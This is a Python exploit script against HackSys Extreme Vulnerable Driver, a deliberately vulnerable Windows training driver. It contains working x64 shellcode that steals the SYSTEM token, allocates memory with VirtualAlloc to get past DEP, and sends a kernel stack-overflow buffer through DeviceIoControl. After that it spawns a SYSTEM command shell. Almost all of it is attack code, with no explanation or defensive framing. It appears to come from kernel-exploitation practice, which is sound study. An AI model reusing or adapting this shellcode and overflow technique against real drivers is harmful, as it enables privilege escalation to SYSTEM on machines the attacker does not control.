import ctypes, sys, struct
from subprocess import *
from ctypes import *



#Set the kernel dll
kernel32 = windll.kernel32
hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)

if not hevDevice or hevDevice == -1:
		print '[+] Could not get handle. [*]'
		sys.exit(0)


#This will define the CTL_CODE
ctl_code = hex((0x00000022 << 16) | (0x00000000 << 14) | (0x800 << 2) | 0x00000003)
print "\n[*]     CTL code is: " + ctl_code + "      [*]" 

#System Token Stealing Payload
print "[*]     Stealing SYSTEM Token      [*]"



shellcode = bytearray(
	"\x48\x31\xc0" 								            # 	xorq	%rax, %rax
	"\x65\x48\x8b\x04\x25\x88\x01\x00\x00"  	# 	movq	%gs:392, %rax
	"\x48\x8b\x40\x70"							          # 	movq	112(%rax), %rax
	"\x48\x89\xc1"								            # 	movq	%rax, %rcx
	"\x49\x89\xcb"								            # 	movq	%rcx, %r11
	"\x49\x83\xe3\x07"							          # 	andq	$7, %r11
	"\xba\x04\x00\x00\x00"						        # 	movl	$4, %edx
	"\x48\x8b\x80\x88\x01\x00\x00"				    # 	movq	392(%rax), %rax
	"\x48\x2d\x88\x01\x00\x00"					      # 	subq	$392, %rax
	"\x48\x39\x90\x80\x01\x00\x00"				    # 	cmpq	%rdx, 384(%rax)
	"\x75\xea"									              # 	jne	-22 <.text+0x1f>
	"\x48\x8b\x90\x08\x02\x00\x00" 				    #	  movq	520(%rax), %rdx
	"\x48\x83\xe2\xf0"							          # 	andq	$-16, %rdx
	"\x4c\x09\xda"								            # 	orq	%r11, %rdx
	"\x48\x89\x91\x08\x02\x00\x00"				    # 	movq	%rdx, 520(%rcx)
	"\x48\x83\xc4\x28" 							          #	  addq	$40, %rsp
	"\xc3"										                # 	retq
)

print "[*]  VirtualAlloc() to Bypass DEP  [*]"
#VirtualAlloc to Bypass DEP
ptr = kernel32.VirtualAlloc(c_int(0),c_int(len(shellcode)),c_int(0x3000),c_int(0x40))
buff = (c_char * len(shellcode)).from_buffer(shellcode)
kernel32.RtlMoveMemory(c_int(ptr),buff,c_int(len(shellcode)))
shellcode_final = struct.pack("<Q",ptr)



print "[*]      Sending Buffer!!!         [*]"

RDI = "B"*8
STACK = "C"*8
RBX = "D"*8
RSI = "E"*8

exploit = 'A' * 2048 + RDI + shellcode_final
explLength = len(exploit)

kernel32.DeviceIoControl(hevDevice, 0x222003, exploit, explLength, None, 0, byref(c_ulong()), None)
print "[*]   Popping a NT/System Shell!!! [*]"
Popen("start cmd", shell=True)
